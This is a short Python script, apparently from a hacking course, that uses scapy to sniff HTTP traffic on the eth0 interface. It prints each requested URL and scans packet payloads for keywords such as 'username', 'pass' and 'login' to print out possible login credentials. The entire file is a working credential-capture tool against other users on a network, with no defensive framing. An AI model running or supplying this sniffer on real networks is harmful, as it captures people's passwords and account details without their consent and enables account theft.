#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def getUrl(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def getLoginInfo(packet):
    # check if the packet has a Raw layer
    if (packet.haslayer(scapy.Raw)):
        # keep only the load field
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "uname", "password", "pass", "passwd", "login"]
        # check if any of the keywords exist in the packet sent
        for keyword in keywords:
            if (keyword in str(load)):
                return load


def process_sniffed_packet(packet):
    # check if the packet has an HTTP layer
    if (packet.haslayer(http.HTTPRequest)):
        # --- URLs ---
        url = getUrl(packet)
        print("[+] HTTP Request >> " + str(url))

        # --- Login Credentials ---
        login_info = getLoginInfo(packet)
        if (login_info):
            print("\n\n[+] Possible login credentials: username/password > " + str(login_info), end="\n\n")


sniff("eth0")